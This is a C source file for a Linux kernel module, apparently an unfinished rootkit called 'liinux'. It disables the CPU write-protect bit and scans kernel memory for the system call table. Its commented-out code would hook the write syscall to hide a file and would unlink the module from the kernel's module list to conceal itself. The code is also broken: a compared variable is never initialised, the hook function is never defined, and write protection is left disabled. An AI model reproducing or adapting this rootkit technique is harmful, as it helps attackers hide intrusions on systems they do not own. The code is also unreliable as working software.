/*
It is just a sample with hijack system call of write in sys_call_table to hide target file. 
Because sys_call_table is not export symbol any more since kernel 2.6.x, 
it get its address by define a kernel memory range then brute force it.
*/
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

#include <linux/kobject.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/string.h>
#include <linux/slab.h>


#if defined(__i386__)
	#define START_CHECK 0xc0000000
	#define END_CHECK 0xd0000000
	typedef unsigned int psize;
#else
	#define START_CHECK 0xffffffff81000000
	#define END_CHECK 0xffffffffa2000000
	typedef unsigned long psize;
#endif

#define HIDE_STR "liinux"

asmlinkage ssize_t (*orig_write)(int fd, const char __user *buff, ssize_t count);

static unsigned long *sct;


unsigned long *generic_find_sys_call_table(void){
	unsigned long *syscall_table;
	unsigned long _sys_close;
	unsigned long int i;



	for (i = PAGE_OFFSET; i < ULONG_MAX; i += sizeof(void *)) {
		syscall_table = (unsigned long *)i;

		if (syscall_table[__NR_close] == (unsigned long)_sys_close)

			return syscall_table;
	}
	return NULL;
}

int liinux_init(void) {

    // hide this kernel object
   // list_del_init(&__this_module.list);
   // kobject_del(&THIS_MODULE->mkobj.kobj);
    // clear the write protect flag bit
    write_cr0(read_cr0() & (~ 0x10000));

    //get the sys_call_table
    sct =  (unsigned long *)generic_find_sys_call_table();

    printk(KERN_INFO "liinux loaded%p:\n", sct);
    /*
    // clear the write protect flag bit
    write_cr0(read_cr0() & (~ 0x10000));
    // hijack system call and save it
    orig_write = (void *) xchg(&sys_call_table[__NR_write],liinux_write);
    // reset the write protect flag bit
    write_cr0(read_cr0() | 0x10000);
    printk("liinux loaded\n");*/
    return 0;
}


void liinux_exit(void) {
	/*write_cr0(read_cr0() & (~0x10000));
	xchg(&sys_call_table[__NR_write],orig_write);
	write_cr0(read_cr0() | 0x10000);*/
	printk("liinux unloaded\n");
}


module_init(liinux_init);
module_exit(liinux_exit);